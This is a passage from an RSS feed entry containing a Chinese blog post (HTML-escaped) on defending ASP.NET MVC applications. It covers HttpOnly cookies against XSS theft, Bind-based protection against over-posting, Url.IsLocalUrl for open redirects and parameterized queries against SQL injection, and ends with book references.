                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; HttpException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;来自非法网站&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }
        }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;4.3 cookie&lt;span&gt;盗窃&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;cookie&lt;span&gt;有两种形式&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1）&lt;span&gt;会话&lt;/span&gt;cookie&lt;span&gt;：存储在浏览器内存中，浏览器每次请求通过&lt;/span&gt;&lt;span&gt;Http&lt;/span&gt;&lt;span&gt;头进行传递&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2）&lt;span&gt;持久性&lt;/span&gt;cookie&lt;span&gt;：存储在硬盘上，同样通过&lt;/span&gt;&lt;span&gt;Http&lt;/span&gt;&lt;span&gt;头进行传递&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;二者的区别：会话&lt;/span&gt;cookie&lt;span&gt;常在会话结束时失效，而持久性&lt;/span&gt;&lt;span&gt;cookie&lt;/span&gt;&lt;span&gt;在下一次访问站点时仍然有效。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;被窃取的原因：依赖于&lt;/span&gt;XSS&lt;span&gt;漏洞，注入一段恶意脚本就能窃取。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;防御方法：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1）&lt;span&gt;在&lt;/span&gt;web.config&lt;span&gt;对&lt;/span&gt;&lt;span&gt;cookie&lt;/span&gt;&lt;span&gt;进行设置&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;httpCookies httpOnlyCookies=&quot;true&quot;/&amp;gt;&lt;span&gt;，&lt;/span&gt;httpOnlyCookies&lt;span&gt;指定为&lt;/span&gt;true表达仅服务器可以访问，浏览器无法访问&lt;/p&gt;
&lt;p&gt;2）&lt;span&gt;在编写代码时为每个&lt;/span&gt;cookie&lt;span&gt;单独设置&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Response.Cookies[&quot;cok&quot;].Value = Guid.NewGuid().ToString();&lt;/p&gt;
&lt;p&gt;Response.Cookies[&quot;cok&quot;].HttpOnly = true;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4.4&lt;span&gt;重复提交&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;防御方法：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1）&lt;span&gt;使用&lt;/span&gt;bind&lt;span&gt;特性，设置想要绑定的属性来，防止这种攻击。也可以设置不要绑定的字属性，但优先选择设置要绑定的属性。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;例：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;可以指定多个字段，用逗号分隔&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; ActionResult TestViewData([Bind(Include = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Field,Field1,Field1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]ModelF mf)
{
     ......
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;2&lt;span&gt;）使用&lt;/span&gt;UpdateModel&lt;span&gt;或&lt;/span&gt;TryUpdateModel&lt;/p&gt;
&lt;p&gt;3）使用ViewModel，明确规定View使用的数据模型&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4.5&lt;span&gt;开放重定向&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;防御方法：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;使用&lt;/span&gt;Url.IsLocalUrl&lt;span&gt;检测是否为本地&lt;/span&gt;url&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4.6 SQL&lt;span&gt;注入攻击&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;防御方法：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;通过参数注入非法获得或修改网站数据。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;使用参数化查询来防止&lt;/span&gt;SQL&lt;span&gt;注入攻击。&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;参考：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;1.Jess Chadwick/Todd Snyder/Hrusikesh Panda，徐雷/徐扬&lt;/p&gt;
&lt;p&gt;译。ASP.NET MVC4 Web编程&lt;/p&gt;
&lt;p&gt;2.Jon Galloway/Phil Haack/Brad Wilson/K. Scott Allen，孙远帅/邹权译  ASP.NET MVC4 高级编程（第四版）&lt;/p&gt;
&lt;p&gt;3.黄保翕，ASP.NET MVC4开发指南&lt;/p&gt;
&lt;p&gt;4.蒋金楠，ASP.NET MVC4框架揭秘&lt;/p&gt;
&lt;p&gt;5.https://www.asp.net/mvc&lt;/p&gt;

&lt;p&gt;-----------------------------------------------------------------------------------------&lt;/p&gt;
&lt;p&gt;转载与引用请注明出处。&lt;/p&gt;
&lt;p&gt;时间仓促，水平有限，如有不当之处，欢迎指正。&lt;/p&gt;
</description>
<pubDate>Sat, 24 Mar 2018 02:03:00 +0000</pubDate>
<dc:creator>甜橙很酸</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/hdwgxz/p/8637421.html</dc:identifier>
</item>
</channel>
</rss>